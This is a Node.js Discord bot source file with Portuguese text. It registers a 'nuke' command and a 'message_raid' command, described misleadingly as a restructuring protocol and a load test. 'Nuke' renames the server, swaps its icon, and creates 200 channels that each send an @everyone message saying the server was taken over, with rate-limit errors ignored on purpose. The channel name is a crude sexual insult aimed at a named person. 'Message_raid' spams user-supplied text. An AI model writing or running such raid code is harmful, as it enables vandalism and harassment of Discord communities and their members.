const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
require('dotenv').config();

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const commands = [
    new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Executa protocolo de reestruturação massiva')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('message_raid')
        .setDescription('Teste de carga de mensagens')
        .addStringOption(option => 
            option.setName('texto')
                .setDescription('Conteúdo para o teste de saturação')
                .setRequired(true))
].map(command => command.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
    try {
        console.log('[P] Registrando comandos slash...');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[P] Comandos registrados.');
    } catch (error) {
        console.error('[P] Erro no registro:', error);
    }
})();

client.on('ready', () => {
    console.log(`[P] Logado como ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'nuke') {
        await interaction.reply({ content: '[P] Protocolo Nuke iniciado.', ephemeral: true });

        try {
            await interaction.guild.setName('Theo bots anti RAID');
            await interaction.guild.setIcon('https://cdn.discordapp.com/attachments/1525751548477706351/1525871668780601384/IMG_6058.png');
        } catch (e) {
            console.error('[P] Falha nos metadados:', e.message);
        }

        const channelName = 'MEU NOME É BERNADO EU SOU UM GULOSAO, EU QUERO DAR PRA UM MONTÃO';
        const messageContent = '@everyone ESTE SERVER FOI COMIDO PELO THEO, NÃO A NADA A SER FEITO \n ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄';

        const tasks = Array.from({ length: 200 }, async () => {
            try {
                const channel = await interaction.guild.channels.create({ name: channelName });
                await channel.send(messageContent);
            } catch (err) {
                // Rate limit ignorado para performance
            }
        });

        Promise.allSettled(tasks);
    }

    if (commandName === 'message_raid') {
        const texto = interaction.options.getString('texto');
        await interaction.reply({ content: '[P] Iniciando raid de mensagens.', ephemeral: true });

        for (let i = 0; i < 10; i++) {
            try {
                await interaction.channel.send(texto);
            } catch (e) {}
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
});

client.login(TOKEN);
